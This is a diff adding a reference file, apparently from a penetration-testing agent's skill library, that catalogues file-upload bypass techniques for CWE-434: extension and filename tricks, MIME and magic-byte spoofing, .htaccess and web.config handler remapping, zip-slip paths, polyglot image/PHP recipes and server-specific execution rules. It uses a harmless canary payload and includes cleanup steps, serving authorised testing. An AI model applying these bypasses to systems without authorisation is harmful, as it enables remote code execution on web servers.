@@ -1,0 +1,89 @@
+---
+name: upload_bypass
+description: Upload bypass matrix (CWE-434) (from rce_fast_path_verification specialist
+  reference library)
+---
+
+# Upload bypass matrix (CWE-434)
+
+Full bypass matrix, polyglot construction notes, server-specific execution
+rules. All code content is the benign canary form
+(`<?php echo "rj-pt-<engagement>-<nonce>"; ?>`) — no webshells, no command
+loops. Generate the matrix with `scripts/upload_bypass_gen.py`.
+
+## 1. Filename bypass matrix
+
+| Technique | Examples (base `shell.php`) | Defeats |
+|---|---|---|
+| case | `shell.PHP`, `shell.pHp`, `SHELL.php` | blocklists matching lowercase `.php` |
+| allowlist siblings | `shell.php3` `shell.php4` `shell.php5` `shell.php7` `shell.phtml` `shell.pht` `shell.phar` | allowlists accepting "image or php-family by misconfiguration" and servers mapping siblings to PHP |
+| double extension | `shell.php.jpg`, `shell.jpg.php`, `shell.php.png` | naive "ends with image ext" checks on Apache (multi-handler), and `basename` confusion |
+| trailing chars | `shell.php.`, `shell.php ` (trailing space) | Windows stores strip trailing dot/space; blocklists comparing raw name |
+| null byte (legacy) | `shell.php%00.jpg`, `shell.php\x00.jpg` | PHP < 5.3.4 / old Java URL handlers — modern stacks immune; mark legacy |
+| NTFS ADS | `shell.php::$DATA`, `shell.php:.jpg` | IIS/NTFS streams; blocklist sees `.jpg` |
+| IIS semicolon | `shell.asp;.jpg` | IIS 6/7.x classic parses up to `;` |
+| dot after ext | `shell.php.` (dot run `shell..php`) | regex `\.php$` mismatches |
+| unicode look-alike | `sh​ell.php` (zero-width), `shell.p hö` | naive normalization/regex checks — verify what the store really received |
+| path traversal | `../../shell.php`, `..\..\shell.php` | filename joined into storage path; writes outside the upload dir (coordinate — may be out of web root; that is LFI-chain territory) |
+
+Upload serially, one variant at a time; record exactly which variant was
+accepted and where it was stored.
+
+## 2. Content bypass matrix
+
+| Technique | Content shape | Defeats |
+|---|---|---|
+| MIME mismatch | PHP canary content, `Content-Type: image/jpeg` | client-side or header-only validation |
+| magic-byte prefix | `GIF89a` + `\n` + canary PHP | `getimagesize()`-only checks, weak sniffers |
+| real image + payload | valid JPEG/PNG with payload in metadata/comment | content sniffers that parse the image and ignore comments |
+| config upload | `.htaccess` (`AddType application/x-httpd-php .rjpt`) then `shell.rjpt` (canary PHP content) | Apache: extension allowlists that ignore dotfiles |
+| config upload (IIS) | `web.config` mapping `*.rjpt` to the ASP.NET handler, then `shell.rjpt` | IIS allowlists ignoring web.config |
+| zip-slider | archive entry named `../../../../var/www/shell.rjpt` | extraction-time path traversal (zip-slip) — server must extract archives |
+
+## 3. Polyglot byte-level recipes
+
+Canary content placeholder: `CANARY_PHP = <?php echo "rj-pt-<eng>-<nonce>"; ?>`
+
+- GIF/PHP: `47 49 46 38 39 61` (`GIF89a`) + `0A` + `CANARY_PHP`. Passes
+  `getimagesize()`; executes when served through PHP handler.
+- JPEG/PHP: SOI `FF D8` + APP0 `FF E0 00 10 4A 46 49 46 00 ...` + COM segment
+  `FF FE <len16>` containing `CANARY_PHP` + EOI `FF D9`. Payload inside a
+  valid JPEG stream.
+- PNG/PHP: signature `89 50 4E 47 0D 0A 1A 0A` + minimal IHDR + `tEXt` chunk
+  (`74 45 58 74` + `Payload\0` + `CANARY_PHP` + CRC32 of the chunk data) +
+  `IEND`. Chunk CRC must be computed — descriptions only here; build in the
+  container when needed.
+- zip-slider: standard ZIP with entry name `../../../../var/www/html/x.rjpt`
+  containing `CANARY_PHP`.
+
+## 4. Server-specific execution rules
+
+| Server | Rule to remember |
+|---|---|
+| Apache + mod_php | `AddHandler application/x-httpd-php` matches ANY extension in a multi-dot name — `shell.php.jpg` executes when `.php` appears anywhere |
+| Apache + php-fpm | `SetHandler`/ProxyPassMatch — usually exact `.php`; try `.phtml`/siblings |
+| nginx + php-fpm | legacy `cgi.fix_path_info=1` executes `/shell.jpg/x.php` (path-info); modern `try_files` blocks it — verify, don't assume |
+| IIS | semicolon parsing (`shell.asp;.jpg`), ADS (`::$DATA`), `web.config` handler mapping |
+| S3/CDN-fronted stores | no execution by default; the finding is content-type/serve-as-HTML (stored XSS chain to `55`), not RCE — state limits exactly |
+
+## 5. Execution trigger discovery
+
+1. Find the stored path: upload response body, predictable
+   `/uploads/<ts>_<name>`, directory listing via `10`.
+2. Re-request the stored file; success = canary echo in body.
+3. If inert: try path-info suffixes (`/file.jpg/x.php`), sibling extensions
+   for the same stored content, and a second request after `.htaccess`
+   upload.
+4. Multiple frontends possible: test the origin URL directly when the CDN
+   masks it (from the P1 inventory).
+5. Prove once, replay for D2, then delete the file and re-request until 404 —
+   the 404 response is the cleanup evidence.
+
+## 6. Cleanup
+
+- Delete every uploaded variant (accepted or not, if it stored).
+- Re-request each stored path until 404; keep one 404 pair per file.
+- Remove `.htaccess`/`web.config` if uploaded.
+- Note for the debrief: filenames and timestamps remain in access logs —
+  hand the list to `85-logging-monitoring`.
+
